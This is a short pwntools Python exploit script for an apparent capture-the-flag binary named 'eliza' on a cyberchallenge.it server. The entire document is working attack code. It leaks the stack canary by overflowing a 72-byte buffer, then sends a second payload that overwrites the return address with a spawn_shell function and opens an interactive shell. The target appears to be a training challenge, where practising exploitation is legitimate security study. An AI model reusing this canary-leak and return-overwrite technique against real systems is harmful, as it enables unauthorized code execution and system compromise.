from pwn import *

BIN: str = './eliza'
HOST: str = 'eliza.challs.cyberchallenge.it'
PORT: int = 9131

CANARY_OFFSET: int = 72
SPAWN_SHELL_ADDR: int = 0x400897

def get_target():
  if args.REMOTE:
    return connect(HOST, PORT)
  else:
    return process(BIN)


def main():
  app = get_target()
  leak_canary_payload: bytes = (
    b'A'*CANARY_OFFSET +  # Pad up to the first byte of canary
    b'B'                  # Random non-null byte
  )
  app.send(leak_canary_payload)
  res = app.recvuntil(b'" is too long').split(b'"')[-2]
  leak = res[len(leak_canary_payload):]
  canary = b'\x00' + leak[:7]
  print(len(canary), canary)
  shell_payload = (
    b'A'*CANARY_OFFSET +    # Pad up to the first byte of canary
    canary +                # Canary
    b'A' * 8 +              # RBP
    p32(SPAWN_SHELL_ADDR)   # spawn_shell
  )
  app.send(shell_payload)
  app.sendline()
  app.interactive()
  app.close()  

if __name__ == "__main__":
  main()